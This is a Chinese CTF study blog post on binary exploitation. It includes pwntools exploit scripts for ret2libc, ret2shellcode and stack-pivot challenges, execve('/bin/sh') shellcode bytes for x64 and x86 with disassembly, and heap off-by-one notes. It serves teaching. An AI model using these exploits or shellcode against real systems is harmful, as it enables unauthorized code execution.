@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Mr.Be1ieVe&#39;s Treasure">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg">
+    <meta property="twitter:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg" />
+    
+
+    
+    <meta name="title" content="pwn_by_examples" />
+    <meta property="og:title" content="pwn_by_examples" />
+    <meta property="twitter:title" content="pwn_by_examples" />
+    
+
+    
+    <meta name="description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。">
+    <meta property="og:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    <meta property="twitter:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Mr.Be1ieVe">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>pwn_by_examples | Mr.Be1ieVe的博客 | Mr.Be1ieVe&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/pwn_by_examples/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Mr.Be1ieVe&#39;s Treasure</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">个人原则宪法</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%AE%9E%E8%B7%B5">安全建设实践</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E4%B8%8E%E5%88%86%E6%9E%90">底层原理思考与分析</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-universe.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/" title="[CTF 教程]">
+                            [CTF 教程]
+                        </a>
+                        
+                        <a class="tag" href="/tags/" title="[CTF 备忘]">
+                            [CTF 备忘]
+                        </a>
+                        
+                    </div>
+                    <h1>pwn_by_examples</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Mr.Be1ieVe&#39;s Treasure
+                             
+                            on 
+                            Tuesday, January 28, 2020
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <p>x64参数按在rdi,rsi,rdx,rcs,r8,r9依次储存</p>
+<h2 id="ida部分">IDA部分</h2>
+<p>shift f12 字符串</p>
+<p>n 重命名</p>
+<p>x 查看引用</p>
+<h2 id="bash部分">bash部分</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cyclic <span style="color:#bd93f9">200</span> <span style="color:#6272a4">#生成循环 200个</span>
+</span></span><span style="display:flex;"><span>cyclic -l xxxxx <span style="color:#6272a4">#计算偏移</span>
+</span></span></code></pre></div><h2 id="pwntools部分">PWNTOOLS部分</h2>
+<pre tabindex="0"><code>u64 
+asm 
+disasm 
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>sh <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./ret2libc2&#39;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./ret2libc2&#39;</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;a&#39;</span> <span style="color:#ff79c6">*</span> offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;gets&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(rop<span style="color:#ff79c6">.</span>search(<span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>address)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>bss() <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;system&#39;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p32(elf<span style="color:#ff79c6">.</span>bss() <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x100</span>)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>sh<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></div><p>先执行了pop_ret 然后执行gets，并放到了bss()+ 0x100的地方。随后system(elf.bss()+ 0x100)</p>
+<h2 id="pwndbg部分">pwndbg部分</h2>
+<h2 id="ret2shellcode">ret2shellcode</h2>
+<p>jmp esp</p>
+<p>函数返回的时候esp会刚好指向返回地址的下一个地址</p>
+<p>
+  <img src="/img/pwn_by_examples/image-20200125172524547.png" alt="image-20200125172524547">
+
+</p>
+<hr>
+<blockquote>
+<p>作者：看雪学院
+链接：https://www.jianshu.com/p/1bdac9837eff
+来源：简书</p>
+</blockquote>
+<h2 id="第一题堆栈直接执行shellcode">第一题（堆栈直接执行shellcode）</h2>
+<p>接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。</p>
+<p>pwn5（参考“阅读原文”）</p>
+<p>继续前面的套路。</p>
+<p><strong>第一步，查看保护</strong></p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7cimageView2/2/w/644/format/webp" alt="img">
+
+</p>
+<p>发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。</p>
+<p><strong>第二步，判断漏洞函数。</strong></p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7cimageView2/2/w/480/format/webp" alt="img">
+
+</p>
+<p>发现函数是read，仅仅读取0x40（64）个字节。</p>
+<p><strong>第三步，计算目标变量的在堆栈中距离ebp的偏移</strong></p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7cimageView2/2/w/388/format/webp" alt="img">
+
+</p>
+<p>EBP的内容为：0x3761413661413561</p>
+<blockquote>
+<p>$ python patternLocOffset.py -l 700 -s 0x3761413661413561</p>
+<p>[*] Create pattern string contains 700 characters ok!</p>
+<p>[*] No exact matches, looking for likely candidates&hellip;</p>
+<p>[+] Possible match at offset 16 (adjusted another-endian)</p>
+<p>[+] take time: 0.0005 s</p>
+</blockquote>
+<p>距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。</p>
+<p>这里可以发现IDA分析的又是正确的了，0x10个字节。</p>
+<p><strong>第四步和第五步，分析是否已经载入了可以利用的函数</strong></p>
+<p>如system，execve等</p>
+<p>发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。</p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7cimageView2/2/w/448/format/webp" alt="img">
+
+</p>
+<p>理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：</p>
+<blockquote>
+<p># 23 bytes</p>
+<p># <a href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p>
+<p>shellcode_x64 = &ldquo;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&rdquo;</p>
+</blockquote>
+<p>它的汇编形式是：</p>
+<blockquote>
+<p># char *const argv[]</p>
+<p>xorl %esi, %esi</p>
+<p>#</p>
+<p>&lsquo;h&rsquo; &rsquo;s&rsquo; &lsquo;/&rsquo; &lsquo;/&rsquo; &rsquo;n&rsquo; &lsquo;i&rsquo; &lsquo;b&rsquo; &lsquo;/&rsquo;</p>
+<p>movq $0x68732f2f6e69622f, %rbx</p>
+<p>#</p>
+<p>for &lsquo;\x00&rsquo;</p>
+<p>pushq %rsi</p>
+<p>pushq %rbx</p>
+<p>pushq %rsp</p>
+<p>#</p>
+<p>const char *filename</p>
+<p>popq %rdi</p>
+<p>#</p>
+<p>__NR_execve 59</p>
+<p>pushq $59</p>
+<p>popq %rax</p>
+<p>#</p>
+<p>char *const envp[]</p>
+<p>xorl %edx, %edx</p>
+<p>syscall</p>
+</blockquote>
+<p>好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。</p>
+<p>我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。</p>
+<p>处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：</p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7cimageView2/2/w/729/format/webp" alt="img">
+
+</p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7cimageView2/2/w/506/format/webp" alt="img">
+
+</p>
+<p>它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）。</p>
+<p>那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。</p>
+<blockquote>
+<p>from pwn import *</p>
+<p>code = ELF(&rsquo;./pwn5&rsquo;)</p>
+<p># 23 bytes</p>
+<p># <a href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p>
+<p>shellcode_x64 = &ldquo;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&rdquo;</p>
+<p>sh.recvuntil(&rsquo;[&rsquo;)</p>
+<p>buf_addr = sh.recvuntil(&rsquo;]&rsquo;, drop=True)</p>
+<p>buf_addr = int(buf_addr, 16)</p>
+<p>payload = &lsquo;b&rsquo; * 24 + p64(buf_addr + 32) + shellcode_x64</p>
+<p>sh.sendline(payload)</p>
+<p>sh.interactive()</p>
+</blockquote>
+<p>堆栈的布置图，以及地址的相对位置，以buf为起点。</p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7cimageView2/2/w/699/format/webp" alt="img">
+
+</p>
+<p>第二题（控制esp进行精准打击）</p>
+<p>接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？</p>
+<p>pwn6（参考“阅读原文”）</p>
+<p>继续前面的过程：</p>
+<p><strong>第一步：检测保护情况</strong></p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7cimageView2/2/w/520/format/webp" alt="img">
+
+</p>
+<p>发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。</p>
+<p><strong>第二步，判断漏洞函数</strong></p>
+<p>如gets,scanf等：</p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7cimageView2/2/w/313/format/webp" alt="img">
+
+</p>
+<p>发现是fgets函数，仅仅读取50个字节的字符长度。</p>
+<p><strong>第三步</strong></p>
+<p>计算目标变量的在堆栈中距离ebp的偏移。</p>
+<p>方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。</p>
+<p><strong>第四步和第五步</strong></p>
+<p>分析是否已经载入了可以利用的函数。发现并没有：</p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7cimageView2/2/w/461/format/webp" alt="img">
+
+</p>
+<blockquote>
+<p>$ ROPgadget &ndash;binary stack_pivoting_1 &ndash;string &lsquo;/bin/sh&rsquo;</p>
+<p>Strings information</p>
+<p>============================================================</p>
+</blockquote>
+<p>字符串自然也是没有的。</p>
+<p>我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！</p>
+<p>那么怎么办呢？</p>
+<p>既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。</p>
+<p>这里，我先放图出来解释一下思路：</p>
+<p>
+  <img src="/img/https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7cimageView2/2/w/679/format/webp" alt="img">
+
+</p>
+<p>我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：</p>
+<p>推算shellcode放置的地址</p>
+<p>跳转到shellcode放置的位置</p>
+<p>首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。</p>
+<p>对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的先河。</p>
+<blockquote>
+<p>$ ROPgadget &ndash;binary stack_pivoting_1 &ndash;only &lsquo;jmp|ret&rsquo; | grep &rsquo;esp&rsquo;</p>
+<p>0x08048504 : jmp esp</p>
+</blockquote>
+<p>发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。</p>
+<p>在这里，我们直接可以选择让pwntools产生可执行的代码”sub  esp 0x28; jmp esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。</p>
+<p>最后的EXP按照下面这样布置：</p>
+<blockquote>
+<p>from pwn import *</p>
+<p>sh = process(&rsquo;./pwn6&rsquo;)</p>
+<p>shellcode_x86 = &ldquo;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&rdquo;</p>
+<p>shellcode_x86 += &ldquo;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&rdquo;</p>
+<p>shellcode_x86 += &ldquo;\x0b\xcd\x80&rdquo;</p>
+<p>sub_esp_jmp = asm(&lsquo;sub esp, 0x28;jmp esp&rsquo;)</p>
+<p>jmp_esp = 0x08048504</p>
+<p>payload = shellcode_x86 + (</p>
+<p>0x20 - len(shellcode_x86)) * &lsquo;b&rsquo; + &lsquo;bbbb&rsquo; + p32(jmp_esp) + sub_esp_jmp</p>
+<p>sh.sendline(payload)</p>
+<p>sh.interactive()</p>
+</blockquote>
+<p>注意，这里我们又启用了另外一段代码：</p>
+<p>它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：</p>
+<blockquote>
+<p>shellcode_x86 = &ldquo;\x31\xc9”          # xor   ecx, ecx</p>
+<p>shellcode_x86 += “\xf7\xe1”       # mul   ecx</p>
+<p>shellcode_x86 += “\x51”       # push  ecx</p>
+<p>shellcode_x86 += &ldquo;\x68\x2f\x2f\x73\x68&rdquo; # push 0x68732f2f</p>
+<p>shellcode_x86 += &ldquo;\x68\x2f\x62\x69\x6e&rdquo; # push 0x6e69622f</p>
+<p>shellcode_x86 += “\x89\xe3”       # mov   ebx, esp</p>
+<p>shellcode_x86 += “\xb0\x0b”       # moval, 0xb</p>
+<p>shellcode_x86 += &ldquo;\xcd\x80&rdquo; # int 0x80</p>
+</blockquote>
+<h2 id="堆">堆</h2>
+<p>1、编辑功能是否存在溢出</p>
+<p>2、delete地方是否存在多重释放漏洞，删除了节点之后有没有清0</p>
+<p>​ 检查了节点是否存在，就不能double free</p>
+<p>​ heaparray[v1] = 0LL 清零了</p>
+<p>3、在show函数中有没有检查节点是否存在</p>
+<p>v0[1] = malloc(size) 没有对大小限制也算漏洞</p>
+<p>只有分配大小不能被2*sizeof(size_t)时才会把下一块chunk的prev_size当作自己的内容区域</p>
+<h3 id="off-by-one-漏洞">off by one 漏洞</h3>
+<p><strong>要使用off by one，malloc大小不能是16的倍数（64位情况下）</strong></p>
+<p>read_input(*(headparray[v1] + 1), *heaparray[v1] + 1LL);</p>
+<p>能够修改下一块chunk的size字段，这种情况一般被称为堆扩展技术</p>
+<p>
+  <img src="/img/pwn_by_examples/image-20200126175331744.png" alt="image-20200126175331744">
+
+</p>
+<p>
+  <img src="/img/pwn_by_examples/image-20200126175341238.png" alt="image-20200126175341238">
+
+</p>
+<p>
+  <img src="/img/pwn_by_examples/image-20200126181904887.png" alt="image-20200126181904887">
+
+</p>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://mrbelieve.tech"><img src="/img/favicon.png" />Mr.Be1ieVe&#39;s Treasure</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/ciscn_2019_s_9/" data-toggle="tooltip" data-placement="top" title="ciscn_2019_s_9">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/hgame/" data-toggle="tooltip" data-placement="top" title="Hgame">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/awd" title="awd">
+                            awd
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/buu" title="buu">
+                            buu
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hackthebox" title="hackthebox">
+                            hackthebox
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/linux%E4%BD%BF%E7%94%A8" title="linux使用">
+                            linux使用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0" title="专业学习">
+                            专业学习
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">
+                            基础知识
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
+                            学习笔记
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:mr_believe@outlook.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/MrBe1ieVe">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Mr.Be1ieVe&#39;s Treasure" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Mr.Be1ieVe&#39;s Treasure 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
